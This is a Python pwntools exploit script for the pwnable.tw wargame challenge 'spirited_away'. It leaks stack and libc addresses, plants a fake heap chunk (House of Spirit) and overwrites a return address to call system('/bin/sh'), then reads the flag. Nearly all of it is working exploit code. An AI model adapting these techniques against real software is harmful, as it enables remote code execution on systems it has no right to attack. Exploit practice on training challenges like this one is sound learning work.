#!/usr/bin/env python3

from pwn import *

exe = ELF("./spirited_away_patched")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
	if args.LOCAL:
		r = process([exe.path])
		gdb.attach(r, gdbscript='''
			b *0x08048891
			c
			''')
		input()
	else:
		r = remote("chall.pwnable.tw", 10204)
	return r

def leave_comment(r, nbytes):
	if nbytes == True:
		r.sendlineafter(b"name:", b"Gnas")
	r.sendlineafter(b"age:", b"99")
	r.sendlineafter(b"this movie?", b"dont know")
	if nbytes == True:
		r.sendlineafter(b"your comment:", b"no comment")
	r.sendlineafter(b"leave another comment? <y/n>", b"y")


def main():
	r = conn()

	for i in range(10):
		leave_comment(r, nbytes=True)

	#cnt is now 10 and nbytes = 0

	for i in range(10, 100):
		leave_comment(r, nbytes=False)

	#cnt is now 100 and nbytes = 110


	##

	### Stage 1: Leak stack
	r.sendlineafter(b"name:", b"Gnas")
	r.sendlineafter(b"age:", b"99")

	reason = b"A"*(0xE0-0xA8-1)
	r.sendlineafter(b"this movie?", reason) # reason


	r.sendlineafter(b"your comment:", b"no")

	r.recvuntil(b"Reason: " + reason + b"\n")
	current_ebp = u32(r.recv(4)) - 0x20

	log.info("current_ebp: " + hex(current_ebp))
	
	r.sendlineafter(b"leave another comment? <y/n>", b"y")
	

	### Stage 2: Leak libc
	r.sendlineafter(b"name:", b"Gnas")
	r.sendlineafter(b"age:", b"99")

	reason = b"A"*(0xE8-0xA8-1)
	r.sendlineafter(b"this movie?", reason) # reason


	r.sendlineafter(b"your comment:", b"no")

	r.recvuntil(b"Reason: " + reason + b"\n")
	libc.address = u32(r.recv(4))  - 0x5d33b

	log.info("libc: " + hex(libc.address))
	#input()

	r.sendlineafter(b"leave another comment? <y/n>", b"y")


	### Stage 3: House of Spirit
	new_buf = current_ebp - (0xF8 - 0xB0)
	comment = b"B"*(0xA4-0x50)
	comment += p32(new_buf)
	comment += p32(0)
	comment += p32(0x41)


	reason = b"C"*(0xE8-0xA8)
	reason += p32(0)
	reason += p32(0x1009)



	r.sendlineafter(b"name:", b"Gnas")
	r.sendlineafter(b"age:", b"99")


	r.sendlineafter(b"this movie?", reason) # reason


	r.sendlineafter(b"your comment:", comment)	
	r.sendlineafter(b"leave another comment? <y/n>", b"y")


	### Stage 4: Ret2libc

	system = libc.sym['system']
	binsh = next(libc.search(b'/bin/sh'))

	name = b"\x00"*(0xFC - 0xB0)
	name += p32(system) # return address
	name += p32(0) # return pointer
	name += p32(binsh) # binsh


	r.sendlineafter(b"name:", name)
	r.sendlineafter(b"age:", b"99")


	r.sendlineafter(b"this movie?", b"no") # reason


	r.sendlineafter(b"your comment:", b"no")	
	r.sendlineafter(b"leave another comment? <y/n>", b"n")

	r.sendlineafter(b"Bye", b"cat home/spirited_away/flag")

	# good luck pwning :)

	r.interactive()


if __name__ == "__main__":
	main()
